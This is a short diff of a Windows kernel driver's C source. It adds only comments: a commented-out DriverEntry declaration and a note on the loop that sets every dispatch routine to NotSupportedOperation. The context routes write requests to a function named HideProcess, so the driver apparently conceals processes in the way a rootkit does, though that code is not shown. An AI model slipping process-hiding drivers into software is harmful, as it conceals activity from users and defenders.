@@ -8,6 +8,8 @@
 # define RtlStringCbPrintf RtlStringCbPrintfW
 #endif
 
+//DRIVER_INITIALIZE DriverEntry;
+
 
 #pragma region constants
 UNICODE_STRING Autograph = RTL_CONSTANT_STRING(L"BASH"); // L because its a pointer to wchar_t
@@ -137,7 +139,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegistryPath)
 
 	for(short i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
 	{
-		pDriverObj->MajorFunction[i] = NotSupportedOperation;
+		pDriverObj->MajorFunction[i] = NotSupportedOperation; // handle all not supported operations
 	}
 	pDriverObj->MajorFunction[IRP_MJ_WRITE] = HideProcess;
 
